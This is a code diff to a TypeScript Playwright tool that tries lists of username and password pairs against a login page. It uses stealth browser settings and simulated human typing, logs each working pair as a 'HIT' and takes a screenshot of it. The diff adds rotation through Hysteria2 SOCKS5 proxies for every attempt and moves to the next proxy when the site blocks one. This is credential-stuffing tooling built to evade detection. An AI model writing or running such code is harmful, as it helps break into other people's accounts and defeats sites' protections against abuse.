@@ -7,6 +7,7 @@ import * as fs from 'fs';
 import * as path from 'path';
 import { STEALTH_LAUNCH_ARGS, getStealthContextOptions, injectDeepStealth, simulateHuman, humanType, randDelay } from './stealth-utils';
 import { scanLogin, ScanResult } from './scanner';
+import { initProxies, nextProxy, recordSuccess as proxySuccess, recordFail as proxyFail, printProxyStats, ProxySlot } from './proxy-rotator';
 
 
 // ─── Types ────────────────────────────────────────────────────────────────────
@@ -185,7 +186,8 @@ export async function runLoginAuto(
     console.log(`[auto] Scanner found ${selectors.length} selector(s)`);
   }
 
-  let activeTunnelName: string | null = null;
+  // ── Hysteria2 proxy rotation ─────────────────────────────────────────────
+  const proxies = initProxies();
 
   // ── Stat tracking ────────────────────────────────────────────────────────────
   let attempted = 0;
@@ -196,9 +198,11 @@ export async function runLoginAuto(
   for (let i = 0; i < creds.length; i++) {
     const { username, password } = creds[i];
 
-    const proxyUrl = process.env.PROXY_URL || undefined;
+    // Rotate to next Hysteria2 SOCKS5 proxy for this attempt
+    const proxySlot = nextProxy();
+    const proxyUrl  = proxySlot.url;
 
-    console.log(`\n[auto] [${i + 1}/${creds.length}] ${username} | tunnel: ${activeTunnelName ?? 'none'}`);
+    console.log(`\n[auto] [${i + 1}/${creds.length}] ${username} | proxy: ${proxySlot.name} (port ${proxySlot.port})`);
 
     const browser = await chromium.launch({
       headless: true,
@@ -221,7 +225,7 @@ export async function runLoginAuto(
       timestamp:  new Date().toISOString(),
       success:    false,
       reason:     '',
-      tunnel:     activeTunnelName,
+      tunnel:     proxySlot.name,
       durationMs: 0,
     };
 
@@ -233,6 +237,7 @@ export async function runLoginAuto(
 
       if (outcome.success) {
         console.log(`[auto] ✓ HIT: ${username}:${password} (${outcome.reason})`);
+        proxySuccess(proxySlot);
         succeeded++;
         hits.push(attempt);
         await page.screenshot({ path: `./hit_${username.replace(/[^a-z0-9]/gi, '_')}_${Date.now()}.png`, fullPage: true });
@@ -245,8 +250,9 @@ export async function runLoginAuto(
       attempt.reason     = err.message?.split('\n')[0] ?? 'unknown_error';
       attempt.durationMs = Date.now() - t0;
 
+      proxyFail(proxySlot);
       if (isBlockError(err.message ?? '')) {
-        console.warn('[auto] Block/connection error detected.');
+        console.warn(`[auto] Block/connection error on ${proxySlot.name} — will rotate to next proxy.`);
       }
     }
 
@@ -277,6 +283,7 @@ export async function runLoginAuto(
     }
   }
   console.log(`[auto] Results saved to ${LOGIN_LOG}`);
+  printProxyStats();
   console.log(`${'─'.repeat(54)}\n`);
 }
 
